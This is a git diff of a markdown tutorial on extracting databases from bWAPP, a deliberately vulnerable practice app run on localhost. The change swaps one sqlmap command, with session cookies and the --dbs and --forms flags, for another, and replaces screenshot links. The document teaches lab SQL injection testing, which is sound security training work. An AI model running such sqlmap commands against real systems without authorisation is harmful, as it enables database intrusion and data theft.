@@ -76,11 +76,9 @@ Get database from bWapp
 -u "http://localhost:8025/portal.php?id=1": This specifies the target URL where SQL injection can be tested. Make sure to modify the URL parameter if necessary.
 --dbs: This option tells sqlmap to enumerate the databases on the target server.
 ```sh
-python sqlmap.py -u "http://localhost:8025/portal.php" --data "username=bee&password=bug" --cookie="PHPSESSID=e9jh4k1ilud5lptoj2qc4uiq54; security=0" --dbs
+python sqlmap.py -u "http://localhost:8025/sqli_1.php"  --cookie="PHPSESSID=kjn0r8jf0fackfpdbnvq8b8se6; security_level=0" --dbs --forms
 ```
-<img width="1276" alt="{F3F3B3DE-374A-4EC4-A980-6F650777960E}" src="https://github.com/user-attachments/assets/1dc13cce-7d81-4662-a2f6-88c7302be089">
-<img width="1280" alt="{BA789625-7FBE-4545-B63B-06176EEE808F}" src="https://github.com/user-attachments/assets/07c238b3-031c-4ec1-ae10-0bd47c28e990">
-<img width="1280" alt="{32255D48-C72C-4701-8F22-15DF5CE02193}" src="https://github.com/user-attachments/assets/14c220b5-6a89-4b27-a945-b476ef808169">
+<img width="858" alt="{2EDB7DEE-0CB2-4193-827C-39139690C225}" src="https://github.com/user-attachments/assets/8b534ac0-955b-490c-87a3-9c882ec44f92">
 
 
 
